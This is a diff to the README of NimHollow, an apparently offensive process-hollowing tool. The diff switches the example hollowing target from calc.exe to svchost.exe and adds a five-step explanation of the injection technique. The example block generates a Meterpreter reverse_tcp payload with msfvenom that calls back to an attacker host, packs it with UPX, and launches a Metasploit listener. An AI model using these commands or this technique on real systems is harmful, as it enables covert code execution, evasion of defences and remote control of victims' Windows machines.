@@ -24,7 +24,7 @@ Example:
 
 ```console
 ~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.13.13.37 LPORT=31337 EXITFUNC=thread -f raw -o shellcode.bin
-~$ python3 NimHollow.py shellcode.bin -i 'C:\Windows\System32\calc.exe' -o hollow --upx --rm
+~$ python3 NimHollow.py shellcode.bin -i 'C:\Windows\System32\svchost.exe' -o hollow --upx --rm
 ~$ file hollow.exe
 hollow.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows
 ~$ sudo msfconsole -qr msf.rc
@@ -51,10 +51,25 @@ optional arguments:
 
 ## Process Hollowing in Slides
 
+1\. Create the target process (e.g., `svchost.exe`) in a suspended state.
+
 ![](https://user-images.githubusercontent.com/23141800/132571935-07adfa73-f33d-4c37-b21c-7f8534699a8d.png)
+
+2\. Query created process to extract its base address pointer from PEB (**P**rocess **E**nvironment **B**lock).
+
 ![](https://user-images.githubusercontent.com/23141800/132571944-de967c1f-1518-4d91-a4d6-4d63120017d7.png)
+
+3\. Read 8 bytes of memory (for 64-bit architecture) pointed by the image base address *pointer* in order to get the actual value of the image base address.
+
 ![](https://user-images.githubusercontent.com/23141800/132571951-fb9b08b4-b6ab-4ae9-9387-e6f316fd4500.png)
+
+4\. Read 200 bytes of the loaded EXE image and parse PE structure to get the EntryPoint address.
+
 ![](https://user-images.githubusercontent.com/23141800/132571964-588c830e-de06-4b09-a708-b32c4150a17c.png)
+
+5\. Write the shellcode to the EntryPoint address and resume thread execution.
+
+![](https://user-images.githubusercontent.com/23141800/132572990-cee11f80-59d4-4fd2-a7f7-245805554b35.png)
 
 ## Credits
 
